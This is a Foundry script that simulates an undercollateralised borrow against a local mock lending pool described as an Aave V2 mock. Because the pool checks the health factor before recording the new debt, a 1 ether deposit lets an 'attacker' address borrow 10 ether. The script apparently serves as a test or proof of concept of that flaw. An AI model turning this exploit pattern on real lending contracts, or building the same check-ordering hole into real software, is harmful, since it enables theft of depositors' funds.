// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import "../src/aave/MockLendingPool.sol";

contract FlashLoanAttack is Script {
    function run() external {
        vm.startBroadcast();

        MockLendingPool pool = new MockLendingPool();

        console2.log("=== Aave V2 Mock Flash Loan / Borrow Ordering Simulation ===");
        console2.log("MockLendingPool deployed at:", address(pool));

        // Seed the pool with liquidity from broadcaster
        pool.deposit{value: 50 ether}();
        console2.log("Seeded pool with 50 ether liquidity");

        address attacker = vm.addr(2);
        vm.deal(attacker, 2 ether);

        console2.log("Attacker:", attacker);
        console2.log("Attacker funded with 2 ether");

        vm.startPrank(attacker);

        // Attacker deposits minimal collateral
        pool.deposit{value: 1 ether}();
        console2.log("Attacker deposited 1 ether collateral");

        uint256 hfBefore = pool.healthFactor(attacker);
        console2.log("Health factor before borrow:", hfBefore);

        // Because debts[attacker] == 0 at this moment,
        // healthFactor() returns max and the borrow passes.
        pool.borrow(10 ether);
        console2.log("Attacker borrowed 10 ether");

        uint256 debtAfter = pool.debts(attacker);
        uint256 hfAfter = pool.healthFactor(attacker);

        console2.log("Attacker debt after borrow:", debtAfter);
        console2.log("Health factor after borrow:", hfAfter);

        if (hfAfter < 1) {
            console2.log("Result: position is unsafe after borrow");
        } else {
            console2.log("Result: position remains healthy");
        }

        vm.stopPrank();

        console2.log("=== Simulation Complete ===");

        vm.stopBroadcast();
    }
}